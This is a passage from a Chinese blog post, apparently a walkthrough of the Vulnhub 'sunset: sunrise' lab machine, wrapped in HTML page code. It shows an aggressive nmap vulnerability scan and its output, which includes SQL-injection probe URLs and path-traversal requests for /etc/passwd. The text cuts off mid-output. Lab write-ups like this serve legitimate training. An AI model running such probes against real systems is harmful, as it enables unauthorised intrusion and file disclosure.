@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="少而不学，老而无识。  前言　　  大家好啊，我是那个喜欢打靶机的lengyi，我又回来了。sunset: sunrise是vulnhub上面一个中等难度的靶机，具体介绍地址为：https://www.vulnhub.com/entry/sunset-sunrise,406/， 主要涉及的网络知识点有：  资产发现 目录遍历 漏洞利用 Ｍysql利用 权限提升  好了不多说开始我们的渗透之旅吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机之sunsetsunrise">
+<meta property="og:url" content="https://lengjibo.github.io/vuln/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="少而不学，老而无识。  前言　　  大家好啊，我是那个喜欢打靶机的lengyi，我又回来了。sunset: sunrise是vulnhub上面一个中等难度的靶机，具体介绍地址为：https://www.vulnhub.com/entry/sunset-sunrise,406/， 主要涉及的网络知识点有：  资产发现 目录遍历 漏洞利用 Ｍysql利用 权限提升  好了不多说开始我们的渗透之旅吧。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0117918d804f009552.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t016bd8c444287ce399.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t014201669c5cbf5351.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01c88918cab350c8d9.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0173d3311abbe7c8ab.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t015cd07f5019a63df7.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01e8f7ef39a79e27b6.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01b367003f373aecd2.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01f0db22e0486942c4.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0180b8b701b7a986da.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01871c0ea9801636ba.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01210b4c6c607a9478.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01259d8397e8adc826.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t011846fae9a7512f61.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01a664402bc3e1aec1.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01ed4baebecbc897b7.png">
+<meta property="og:updated_time" content="2020-01-14T04:43:05.154Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub靶机之sunsetsunrise">
+<meta name="twitter:description" content="少而不学，老而无识。  前言　　  大家好啊，我是那个喜欢打靶机的lengyi，我又回来了。sunset: sunrise是vulnhub上面一个中等难度的靶机，具体介绍地址为：https://www.vulnhub.com/entry/sunset-sunrise,406/， 主要涉及的网络知识点有：  资产发现 目录遍历 漏洞利用 Ｍysql利用 权限提升  好了不多说开始我们的渗透之旅吧。">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t0117918d804f009552.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/vuln/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Vulnhub靶机之sunsetsunrise | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Beranda</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Tentang</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategori</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Arsip</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/vuln/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub靶机之sunsetsunrise
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Diposting di</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-01-13 16:19:51" itemprop="dateCreated datePublished" datetime="2020-01-13T16:19:51+08:00">2020-01-13</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2020-01-14 12:43:05" itemprop="dateModified" datetime="2020-01-14T12:43:05+08:00">2020-01-14</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Di</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>少而不学，老而无识。</p>
+<hr>
+<p>前言　　<br>  大家好啊，我是那个喜欢打靶机的lengyi，我又回来了。sunset: sunrise是vulnhub上面一个中等难度的靶机，具体介绍地址为：<a href="https://www.vulnhub.com/entry/sunset-sunrise,406/，" target="_blank" rel="noopener">https://www.vulnhub.com/entry/sunset-sunrise,406/，</a></p>
+<p>主要涉及的网络知识点有：</p>
+<ul>
+<li>资产发现</li>
+<li>目录遍历</li>
+<li>漏洞利用</li>
+<li>Ｍysql利用</li>
+<li>权限提升</li>
+</ul>
+<p>好了不多说开始我们的渗透之旅吧。</p>
+<a id="more"></a>
+<h2 id="前期踩点"><a href="#前期踩点" class="headerlink" title="前期踩点"></a>前期踩点</h2><p>首先使用nmap的sP参数进行主机发现，得到目标地址为192.168.0.103，当然你也可以使用netdiscover等进行主机发现。</p>
+<p><img src="https://p5.ssl.qhimg.com/t0117918d804f009552.png" alt=""></p>
+<p>然后访问该内网地址发现，只有一个静态页面，</p>
+<p><img src="https://p0.ssl.qhimg.com/t016bd8c444287ce399.png" alt=""></p>
+<p>且并无任何提示（有时源代码会有部分提示）：</p>
+<p><img src="https://p5.ssl.qhimg.com/t014201669c5cbf5351.png" alt=""></p>
+<p>于是使用nmap进行简单扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A  -sS -sV -Pn -T4 -p- --script=vuln 192.168.0.103</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">╰─#  nmap -A  -sS -sV -Pn -T4 -p- --script=vuln 192.168.0.103                                              148 ↵</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 16:48 CST</span><br><span class="line">Nmap scan report for 192.168.0.103</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /: Root directory w/ listing on &apos;apache/2.4.38 (debian)&apos;</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.0.103:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.0.103:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.38: </span><br><span class="line">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span><br><span class="line">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span><br><span class="line">|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span><br><span class="line">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span><br><span class="line">|_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP, NULL: </span><br><span class="line">|_    Host &apos;192.168.0.104&apos; is not allowed to connect to this MariaDB server</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp open  http-proxy Weborf (GNU/Linux)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 202</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 326</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">|     &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">|   HTTPOptions, RTSPRequest, SIPOptions: </span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span><br><span class="line">|     DAV: 1,2</span><br><span class="line">|     DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span><br><span class="line">|     MS-Author-Via: DAV</span><br><span class="line">|   Socks5: </span><br><span class="line">|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 199</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|_    &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">| http-enum: </span><br><span class="line">|   /../../../../../../../../../../etc/passwd: Possible path traversal in URI</span><br><span class="line">|   /../../../../../../../../../../boot.ini: Possible path traversal in URI</span><br><span class="line">|_  /html/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Weborf (GNU/Linux)</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port3306-TCP:V=7.80%I=7%D=1/11%Time=5E198BD9%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,4C,&quot;H\0\0\x01\xffj\x04Host\x20&apos;192\.168\.0\.104&apos;\x20is\x20not\x20all</span><br><span class="line">SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSVersion</span><br><span class="line">SF:BindReqTCP,4C,&quot;H\0\0\x01\xffj\x04Host\x20&apos;192\.168\.0\.104&apos;\x20is\x20no</span><br><span class="line">SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port8080-TCP:V=7.80%I=7%D=1/11%Time=5E198BDE%P=x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,187,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\</span><br><span class="line">SF:nContent-Length:\x20326\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C/</span><br><span class="line">SF:/DTD\x20HTML\x204\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/</span><br><span class="line">SF:title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;</span><br><span class="line">SF:tr\x20style=\&quot;background-color:\x20#DFDFDF;\&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\x20href=</span><br><span class="line">SF:\&quot;html/\&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;p&gt;Generated\x20by\x20</span><br><span class="line">SF:Weborf/0\.12\.2\x20\(GNU/Linux\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,B2,&quot;</span><br><span class="line">SF:HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GET</span><br><span class="line">SF:,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDAV</span><br><span class="line">SF::\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\nMS-Author-Via:\x20DAV\r\n</span><br><span class="line">SF:\r\n&quot;)%r(RTSPRequest,B2,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU</span><br><span class="line">SF:/Linux\)\r\nAllow:\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,M</span><br><span class="line">SF:OVE\r\nDAV:\x201,2\r\nDAV:\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\n</span><br><span class="line">SF:MS-Author-Via:\x20DAV\r\n\r\n&quot;)%r(FourOhFourRequest,12B,&quot;HTTP/1\.1\x204</span><br><span class="line">SF:04\x20Page\x20not\x20found:\x20Weborf\x20\(GNU/Linux\)\r\nContent-Lengt</span><br><span 